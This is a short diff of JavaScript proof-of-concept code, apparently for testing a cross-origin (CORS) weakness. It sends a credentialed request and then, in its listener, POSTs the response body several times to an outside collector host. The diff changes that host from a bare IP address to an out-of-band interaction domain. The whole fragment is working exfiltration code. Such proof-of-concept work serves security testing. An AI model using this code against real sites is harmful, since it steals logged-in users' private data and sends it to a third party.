@@ -5,8 +5,8 @@ req.withCredentials = true;
 req.send();
 
 function reqListener() {
-    for(let i = 0; i < 2; i++){
-        fetch('http://164.92.231.31/', {
+    for(let i = 0; i < 3; i++){
+        fetch('https://ck2pp7g2vtc0000mge8ggjtmmdayyyyyb.oast.fun/poc', {
             method: 'POST',
             body: this.responseText
         });
